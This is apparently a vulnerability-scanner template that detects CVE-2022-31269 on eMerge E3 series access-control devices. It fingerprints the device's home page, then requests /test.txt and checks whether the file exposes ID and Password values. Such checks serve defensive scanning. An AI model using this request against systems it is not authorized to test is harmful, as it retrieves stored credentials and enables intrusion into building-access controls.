name: poc-yaml-emerge-e3-series-cve-2022-31269
binding: 73ca61b7-bc7d-420e-a2ef-e2928b239061
manual: true
detail:
    author: xiaobaicai
    links:
        - https://gist.github.com/omarhashem123/71ec9223e90ea76a76096d777d9b945c
    vulnerability:
        id: CT-469641
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: response.status == 200 && response.body.bcontains(b"<link rel=\"shortcut icon\" href=\"./img/emerge.ico\">")
    r1:
        request:
            cache: true
            method: GET
            path: /test.txt
        expression: response.status == 200 && response.body.bcontains(b"ID=") && response.headers["Accept-Ranges"] == string("bytes") && response.body.bcontains(b"Password=")
expression: r0() && r1()
